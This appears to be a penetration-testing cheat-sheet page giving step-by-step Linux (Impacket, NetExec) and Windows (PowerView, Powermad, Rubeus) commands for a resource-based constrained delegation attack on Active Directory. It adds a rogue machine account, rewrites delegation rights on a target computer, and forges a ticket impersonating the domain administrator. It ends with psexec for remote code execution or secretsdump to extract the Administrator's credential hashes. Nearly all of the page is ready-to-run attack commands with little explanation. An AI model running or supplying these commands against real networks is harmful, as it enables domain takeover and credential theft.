---
title: "RBCD Attack"
date: 2024-7-30
tags: ["GenericAll", "active driectory", "ad", "Windows", "rbcd", "resource-based constrained delegation", "s4u", "impersonate"]
---

### RBCD Attack

{{< tab set1 tab1 active >}}Linux{{< /tab >}}
{{< tab set1 tab2 >}}Windows{{< /tab >}}
{{< tabcontent set1 tab1 >}}

#### 0. Check machine account quota

<div>

```console
nxc ldap <TARGET> -u <USER> -p '<PASSWORD>' -M MAQ
```

</div>

#### 1. Add a fake computer

<div>

```console
impacket-addcomputer -computer-name 'EvilComputer' -computer-pass '<COMPUTER_PASSWORD>' -dc-ip <TARGET> '<DOMAIN>/<USER>:<PASSWORD>'
```

</div>

#### 2. Rbcd attack

<div>

```console
impacket-rbcd -delegate-to '<TARGET_COMPUTER>$' -delegate-from 'EvilComputer$' -dc-ip <DC> -action 'write' '<DOMAIN>/<USER>:<PASSWORD>'
```

</div>

#### 3. Impersonate

<div>

```console
sudo ntpdate -s <DC> && impacket-getST -spn cifs/<TARGET_DOMAIN> -impersonate administrator -dc-ip <DC> '<DOMAIN>/EvilComputer:<COMPUTER_PASSWORD>'
```

</div>

#### 4. Import ticket

<div>

```console
export KRB5CCNAME=administrator@cifs_<TARGET_DOMAIN>@<DOMAIN>.ccache
```

</div>

#### 5. Post-Attack

<div>

```console
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```console
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

</div>

{{< /tabcontent >}}
{{< tabcontent set1 tab2 >}}

#### 1. Import PowerView.ps1 

<div>

```console
. .\PowerView.ps1
```

</div>

#### 2. Check machine account quota

<div>

```console
Get-DomainObject -Identity 'DC=<EXAMPLE>,DC=<COM>' | select ms-ds-machineaccountquota
```

</div>

#### 3. Import Powermad.ps1

<div>

```console
. .\Powermad.ps1
```

```console
New-MachineAccount -MachineAccount EvilComputer -Password $(ConvertTo-SecureString '<COMPUTER_PASSWORD>' -AsPlainText -Force)
```

</div>

<small>*Ref: [Powermad.ps1](https://raw.githubusercontent.com/Kevin-Robertson/Powermad/master/Powermad.ps1)*</small>

#### 4. Attack

<div>

```console
$fakesid = Get-DomainComputer EvilComputer | select -expand objectsid
```

```console
$fakesid
```

```console
$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($fakesid))"
```

```console
$SDBytes = New-Object byte[] ($SD.BinaryLength)
```

```console
$SD.GetBinaryForm($SDBytes, 0)
```

```console
Get-DomainComputer TARGET_COMPUTER$ | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
```

</div>

#### 5. Check SecurityIdentifier is now fakesid 

<div>

```console
$RawBytes = Get-DomainComputer TARGET_COMPUTER -Properties 'msds-allowedtoactonbehalfofotheridentity' | select -expand msds-allowedtoactonbehalfofotheridentity
```

```console
$Descriptor = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList $RawBytes, 0
```

```console
$Descriptor.DiscretionaryAcl
```

</div>

#### 6. Impersonate

<div>

```console
.\rubeus.exe hash /password:'<COMPUTER_PASSWORD>' /user:EvilComputer /domain:<DOMAIN>
```

```console
.\rubeus.exe s4u /user:'EvilComputer$' /rc4:<HASH> /impersonateuser:administrator /msdsspn:cifs/<TARGET_DOMAIN> /ptt /nowrap
```

</div>

#### 7. Convert to ccache format

<div>

```console
python3 rubeustoccache.py <BASE64_TICKET> secrets.kirbi secrets.ccache
```

```console
export KRB5CCNAME=secrets.ccache
```

<small>*Ref: [RubeusToCcache](https://github.com/SolomonSklash/RubeusToCcache)*</small>

</div>

#### 8. Post-Attack

<div>

```console
# Remote
sudo ntpdate -s <DC> && impacket-psexec <DOMAIN>/administrator@<TARGET_DOMAIN> -k -no-pass
```

```console
# Or secretsdump
impacket-secretsdump administrator@<TARGET_DOMAIN> -k -no-pass -just-dc-user Administrator
```

</div>

{{< /tabcontent >}}

<br>
